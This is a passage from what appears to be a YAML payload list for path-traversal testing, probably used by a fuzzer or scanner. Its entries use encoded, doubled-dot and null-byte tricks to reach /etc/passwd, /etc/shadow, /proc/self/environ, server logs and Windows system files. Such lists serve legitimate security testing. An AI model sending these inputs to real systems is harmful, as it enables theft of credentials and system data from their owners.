  - "..%c1%9c..%c1%9cetc%c1%9cpasswd"
  # ── Dot-dot-slash tricks ──────────────────────────────────────────
  - "....//....//....//etc//passwd"
  - "....\\\\....\\\\....\\\\etc\\\\passwd"
  - "..\\/..\\/..\\/etc\\/passwd"
  # ── Null byte injection ───────────────────────────────────────────
  - "../../../etc/passwd%00"
  - "../../../etc/passwd%00.png"
  - "../../../etc/passwd\x00"
  # ── Unix — other sensitive files ──────────────────────────────────
  - "../../../etc/hosts"
  - "../../../etc/shadow"
  - "../../../etc/group"
  - "../../../proc/self/environ"
  - "../../../proc/version"
  - "../../../var/log/apache2/access.log"
  - "../../../var/log/nginx/access.log"
  - "../../../../../../var/www/html/index.php"
  # ── Windows ───────────────────────────────────────────────────────
  - "..\\..\\..\\windows\\win.ini"
  - "..%5C..%5C..%5Cwindows%5Cwin.ini"
  - "..%5c..%5c..%5cwindows%5cwin.ini"
  - "../../../../boot.ini"
  - "..%2F..%2F..%2F..%2Fboot.ini"
  - "C:\\Windows\\win.ini"
  - "C:/Windows/win.ini"
  # ── Absolute path bypass ──────────────────────────────────────────
  - "/etc/passwd"
  - "/etc/shadow"
